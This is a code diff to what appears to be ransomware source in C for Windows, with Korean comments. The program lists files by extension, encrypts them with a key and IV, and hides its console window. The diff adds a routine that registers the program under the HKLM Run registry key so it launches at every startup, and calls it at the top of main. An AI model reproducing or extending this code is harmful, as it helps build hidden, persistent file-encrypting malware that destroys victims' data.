@@ -11,16 +11,20 @@
 
 #define NUM_BYTES_READ 32
 #define PATH_SIZE 1000 
-
+#define TRUE 1
+#define FALSE 0
 typedef struct _finddata_t FILE_DATA;
 
 void CheckDevice(void);
 void FileList(char *path, char* ext, int search);
 int do_crypt(const unsigned char *key, const unsigned char *iv, FILE *ifp, FILE *ofp, int isEncrypt);
+BOOL SetStartProgram(LPCSTR lpPosition); // 시작 프로그램으로 등록
 
 unsigned char *key, *iv;
 
 int main(int argc, char** argv) {
+
+	SetStartProgram(argv[0]);
 
 	//콘솔창 안보이게 
 	HWND hWndConsole = GetConsoleWindow(); //윈도우 핸들 콘솔창 호출
@@ -261,3 +265,24 @@ int do_crypt(const unsigned char *key, const unsigned char *iv, FILE *ifp, FILE 
 	return 0;
 }
 
+
+
+BOOL SetStartProgram(LPCSTR lpPosition) {
+	HKEY hKey; // 핸들 키
+	long error; // 에러 확인
+	error = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0L, KEY_WRITE, &hKey); // 레지스터에 있는 키 열기
+	if (error == ERROR_SUCCESS) { // 성공 했는지 확인
+		error = RegSetValueEx(hKey, TEXT("HELLO"), 0, REG_SZ, (BYTE*)lpPosition, lstrlen(lpPosition)); RegCloseKey(hKey); // 리턴받은 핸들키에 Hello라는 레지스트리를 REG_SZ형식으로 만들고 lpPosition 프로그램으로 값을 등록한다.
+		return TRUE;
+
+	}
+	else if (error == ERROR_ACCESS_DENIED) { // 실패 할 경우(권한이 낮을 경우)
+		printf("ERROR_ACCESS_DENIED\n");
+
+	}
+	else {
+		printf("ERRORCODE : %ld\n", error); // 다른 오류 }
+		return FALSE;
+
+	}
+}
